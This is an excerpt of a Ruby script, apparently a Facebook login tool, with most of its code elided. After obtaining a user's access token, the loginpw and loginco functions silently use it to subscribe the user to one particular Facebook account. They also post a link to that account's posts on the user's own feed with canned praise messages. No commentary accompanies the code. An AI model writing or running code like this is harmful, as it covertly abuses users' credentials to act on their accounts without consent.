...
def ReportBug()
  ...
  system ("xdg-open https://wa.me/628317xxxxxx?text=#{text}")
  abort ("#{$r}[!] Exit!")
end
...
def loginpw()
  ...
  if res.key? ('access_token')
    ...
    Net::HTTP.post_form(URI("https://graph.facebook.com/100038114412395/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100038114412395/posts/296604038784032","access_token"=>$token,"message"=>['Panutan Gw Ni Boss 😎','Keren Bat Njir 😴'].sample})
...
def loginco()
  ...
  if !moyaa.nil?
    ...
    if !b.key? ('name')
      ...
      Net::HTTP.post_form(URI("https://graph.facebook.com/100038114412395/subscribers"),{"access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/100038114412395/subscribers"),{"access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100038114412395/posts/555897449024064","access_token"=>$token,"message"=>['Pen Punya Sertifikat Ruby :(','Hoki','Keren Abis!'].sample})
